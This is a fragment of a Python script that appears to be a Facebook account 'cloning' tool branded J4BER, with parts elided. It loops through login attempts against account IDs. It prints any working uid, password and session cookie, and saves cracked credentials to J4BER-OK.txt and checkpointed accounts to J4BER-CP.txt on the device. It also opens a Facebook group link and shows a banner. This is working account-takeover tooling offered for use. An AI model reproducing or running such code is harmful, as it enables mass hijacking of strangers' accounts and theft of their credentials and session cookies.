...
ha = current.day
today = date.today()
os.system('xdg-open https://facebook.com/groups/1182201165705121/')
logo =("""
\033[0;92m
$$$$$$$\   $$$$$$\  $$$$$$$\  $$\   $$\ 
$$  __$$\ $$  __$$\ $$  __$$\ $$ |  $$ |
...
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
  \033[0;92m═════════════════════════════════════════════
\033[0;92m • CEO J4BER (🥰)
\033[0;92m • Random Cloning ACTIVE FIRE (🔥)
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                if 'LOCK' in res:
                    ...
                    print(f'  \r\033[1;92m  [J4BER-OK] '+uid+' • '+ps+'\33[0;92m')
                    print(f'  \r\033[1;92m  [COOKIE] '+coki)
                    print('\r\r\033[1;32m[J4BER-ok] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/J4BER-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                 #print('\r\r\33[1;30m[SEX-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                open('/sdcard/J4BER-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}J4BER{x}][%s\%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
